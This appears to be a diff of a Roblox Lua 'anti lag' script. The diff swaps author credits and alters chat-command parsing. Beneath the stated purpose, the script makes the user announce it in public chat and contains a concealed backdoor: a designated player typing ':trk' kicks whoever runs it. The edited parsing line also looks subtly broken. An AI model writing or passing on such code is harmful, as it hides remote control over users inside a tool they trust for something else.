@@ -3,13 +3,13 @@ local Player = game:GetService('Players').LocalPlayer or game:GetService('Player
 local runservice = game:GetService('RunService')
 local safe = CFrame.new(93486234289567190, 123490821468906714000, 134891670418940198908)
 if Player.Name ~= '0lxad' then
-game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded fiji's anti lag (weaker)","all")
 end
 for i,descendant in game.Workspace:GetDescendants() do
 	if descendant.ClassName == 'Humanoid' then
         if #descendant.DisplayName>50 then
-            descendant.Name = 'Fixed by nim'
-            descendant.DisplayName = 'https://discord.gg/5Ygs9nHRyW'
+            descendant.Name = 'Fixed by Omega'
+            descendant.DisplayName = 'made by fiji#0'
         end
 	end
 end
@@ -17,8 +17,8 @@ end
 local function onDescendantAdded(descendant)
 	if descendant.ClassName == 'Humanoid' then
         if #descendant.DisplayName>50 then
-		    descendant.Name = 'Fixed by nim'
-            descendant.DisplayName = 'https://discord.gg/5Ygs9nHRyW'
+		    descendant.Name = 'Fixed by Omega'
+            descendant.DisplayName = 'made by fiji#0'
         end
 	end
 end
@@ -32,10 +32,10 @@ game.Players.PlayerAdded:Connect(function(plr)
 		print("Daddy found!")
 		local Daddy = plr
 		Daddy.Chatted:Connect(function(msg)
-    		if string.lower(string.split(msg, '.')[1]) == ":trk" then
+    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
       			if Player.Name == '0lxad' then print("Skids kicked")
       			else
-        		local kmsg = string.split(msg, '.')[2]
+        		local kmsg = string.split(msg, ':trk')[1]
             	Player:Kick(kmsg)
       			end
     		end
